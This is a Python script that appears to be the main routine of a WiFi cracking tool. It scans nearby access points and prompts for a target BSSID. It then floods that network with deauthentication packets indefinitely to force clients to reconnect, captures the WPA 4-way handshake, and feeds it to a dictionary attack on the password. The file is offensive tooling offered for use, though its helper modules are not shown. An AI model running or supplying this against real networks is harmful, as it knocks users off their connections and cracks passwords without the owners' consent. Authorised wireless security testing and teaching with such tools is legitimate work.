import os
import subprocess
import time
from scapy.layers.dot11 import PacketList
from information_gathering import InformationGathering
from deauthentication import Deauthentication
from capture_handshake import CaptureHandshake
from dictionary_attack import DictionaryAttack


# ----------select interface----------
subprocess.run(
    args=["ifconfig"]
)
interface: str = input("Select interface (e.g. wlo1): ")


# ----------information gathering----------
info: InformationGathering = InformationGathering(
    iface=interface,
    hopping_channel=True
)
try:
    time.sleep(60)
except KeyboardInterrupt:
    pass
info.stop()
time.sleep(5)
print()


# ----------specify wifi information----------
print("------------------------")
print("Specify wifi information")
print("------------------------")
bssid_mac: str = input("BSSID: ")
ssid: str = ""
channel: int = -1
for _, ap_info in info.get_access_points_information().items():
    if ap_info["|BSSID|"] == bssid_mac:
        ssid = ap_info["|SSID|"]
        channel = ap_info["|Channel|"]
        break
os.system("clear")


# ----------capture 4-way-handshake with deauthentication----------
print("------------------------------------------------------------")
print("Send deauthentication packets to capture the 4-way-handshake")
print("------------------------------------------------------------")
deauth: Deauthentication = Deauthentication(
    iface=interface,
    channel=channel,
    bssid_mac=bssid_mac,
    count=0,
    delay=3.0
)
handshake: CaptureHandshake = CaptureHandshake(
    iface=interface,
    channel=channel
)
try:
    while True:
        time.sleep(60)
except KeyboardInterrupt:
    pass
deauth.stop()
time.sleep(5)
four_way_handshake: PacketList = handshake.stop()
os.system("clear")


# ----------dictionary attack----------
dictionary_attack: DictionaryAttack = DictionaryAttack(
    ssid=ssid,
    handshake=four_way_handshake,
    dictionary_folder=f"{os.getcwd()}/dictionary/my_wordlists"
)
